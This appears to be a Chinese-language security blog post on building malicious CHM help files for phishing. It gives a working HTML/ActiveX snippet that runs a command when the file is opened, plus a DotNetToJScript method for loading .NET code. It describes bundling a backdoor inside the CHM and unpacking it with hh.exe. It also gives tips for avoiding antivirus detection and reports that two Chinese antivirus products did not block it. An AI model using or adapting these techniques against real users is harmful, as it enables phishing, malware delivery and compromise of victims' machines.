---
layout: post
title: "使用CHM文件进行钓鱼"
date: 2020-01-30 17:56:19 +0800
categories: apt
---
进行钓鱼选择合适的payload非常重要，使用一些容易让人放松警惕的文件格式可以大大提高钓鱼的成功率。CHM是微软推出的基于HTML的帮助文件系统，被 IE 浏览器支持的JavaScript, VBScript, ActiveX,等，CHM同样支持。因此使用CHM作为钓鱼的payload非常合适。本文总结了两种基于CHM执行命令的方式。

# 使用com控件命令执行

根据@ithurricanept的twitter

![](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200130165102.png)

<https://twitter.com/ithurricanept/status/534993743196090368>

使用了js调用com控件执行命令

源码如下：

```html
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec 
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',calc.exe'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

## POC

使用HTML Help Workshop

<http://microsoft.com/en-us/download/details.aspx?id=21138>

创建一个新的project，添加文件后进行编译

![](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580212823088.png)


测试：


![](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580212859994.png)


## 利用

实际测试的时候注意到了以下几点：

- 执行命令的时候注意传入的参数与程序名需要用逗号隔开，参数与参数之间不需要。

- 考虑到进行敏感操作会导致杀软提示，因此尽量避免使用powershell、bitsadmin、certutil、cscript等。
- 通过cmd执行命令也属于敏感操作，因此使用多个控件依次执行命令。

在搜索的过程中发现.chm文件的默认程序hh.exe具有decompile的功能，可以将打包进chm的文件释放出来

```
HH.EXE -decompile D:/xTemp/decompile-folder C:/xTemp/XMLconvert.chm
```

因此可以将后门程序一起打包进chm文件中，运行时调用hh.exe释放chm中的后门程序再执行。

测试：

使用360测试的时候效果不太理想，在联网情况下使用hh.exe decompile会被拦截，断网情况下没有问题。

使用火绒测试没有任何拦截。

# 使用js加载.net

既然可以利用chm执行js，那为什么不内嵌.net和dll呢？

<https://github.com/tyranid/DotNetToJScript>

## POC

编写一个.net dll

```csharp
namespace ClassLibrary1
{

    public class Class1
    {
        public Class1()
        {
            /* Start notepad */
			Process.Start("notepad.exe");
        }
    }
}
```

生成js脚本

```
DotNetToJScript.exe -o 1.js ClassLibrary1.dll -c ClassLibrary1.Class1
```

执行js脚本


![](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/1580376712378.png)


## 利用

本来想直接加载shellcode上线，但是有问题，因为对.net不了解所以只能放弃了。。。

最后还是下载后门程序然后执行

测试：

美中不足的是使用js加载.net会有启用activeX控件的警告，必须点“是”之后才能加载。

360火绒均不拦截

![](https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20200130173719.png)
